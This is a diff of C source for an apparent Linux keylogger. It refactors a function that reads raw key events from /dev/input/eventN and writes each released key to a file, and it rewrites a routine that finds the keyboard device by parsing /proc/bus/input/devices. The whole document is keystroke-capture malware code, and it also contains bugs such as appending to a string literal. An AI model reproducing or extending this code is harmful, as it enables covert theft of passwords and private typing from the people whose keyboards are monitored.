@@ -9,12 +9,19 @@
 
 #include "keylogger.h"
 
-void capture_keys(FILE *file, char *event) {
+#define BUFFER_SIZE 512
+
+void capture_keys(FILE *file, char *event)
+{
+	printf("a\n");
+
 	struct input_event ev;
 
 	char *path = "/dev/input/";
 
 	strcat(path, event);
+
+	printf("%s", path);
 
 	int fd = open(path, O_RDONLY);
 
@@ -25,56 +32,62 @@ void capture_keys(FILE *file, char *event) {
 		int r = read(fd, &ev, sizeof(ev));
 		if ((ev.type == EV_KEY) && (ev.value == 0))
 		{
-			if (ev.code == 28) fprintf(file, "\n");
-			if (ev.code == 14) fprintf(file , "<=");
+			if (ev.code == 28)
+				fprintf(file, "\n");
+			if (ev.code == 14)
+				fprintf(file, "<=");
 			else
 			{
-				
+
 				fprintf(file, "%c", map[ev.code]);
 			}
 			fflush(file);
 		}
 	}
-	
+
 	close(fd);
 }
 
-void find_keyboard(char *buffer, FILE *file) {
+char *find_keyboard()
+{
 	FILE *ptr;
-    size_t sz_line;
-    char line;
-    char handlers[256];
+	char line[BUFFER_SIZE];
+	char *handlers_line;
+	char *event;
+	int i = -1;
 
-    ptr = fopen("/proc/bus/input/devices", "r");
+	ptr = fopen("/proc/bus/input/devices", "r");
 
-	if (ptr < 0)
+	while (fgets(line, BUFFER_SIZE, ptr))
 	{
-		fprintf(file, "erro\n");
-		fflush(file);
-		exit(EXIT_FAILURE);
+
+		if (i == 1)
+		{
+
+			if (strstr(line, "EV=120013") != NULL)
+			{
+				break;
+			}
+			else
+			{
+				i = -1;
+			}
+		}
+		if (i == 2)
+		{
+			i--;
+		}
+
+		if (strstr(line, "Handlers") != NULL)
+		{
+			i = 2;
+			handlers_line = strdup(line);
+		}
 	}
-
-    while (getline(&line, &sz_line, ptr) != -1)
-    {
-        if (strstr(line, "Handlers") != NULL) {
-            strcpy(handlers, line);
-            getline(&line, &sz_line, ptr);
-            getline(&line, &sz_line, ptr);
-            if (strstr(line, "EV=120013") != NULL) break;
-        }
-    }
-
-    char *ev_ptr = strstr(handlers, "event");
-    if (ev_ptr == NULL) printf("erro\n");
-    else 
-    {
-		int i = 0;
-        for (char *p = ev_ptr; *p != ' '; p++)
-        {
-            buffer[i++] = *p;
-        }
-        buffer[i++] = '\0';
-    }
-
 	fclose(ptr);
+
+	event = strstr(handlers_line, "event");
+	char *ans = strndup(event, 7);
+	ans[6] = '\n';
+	return ans;
 }
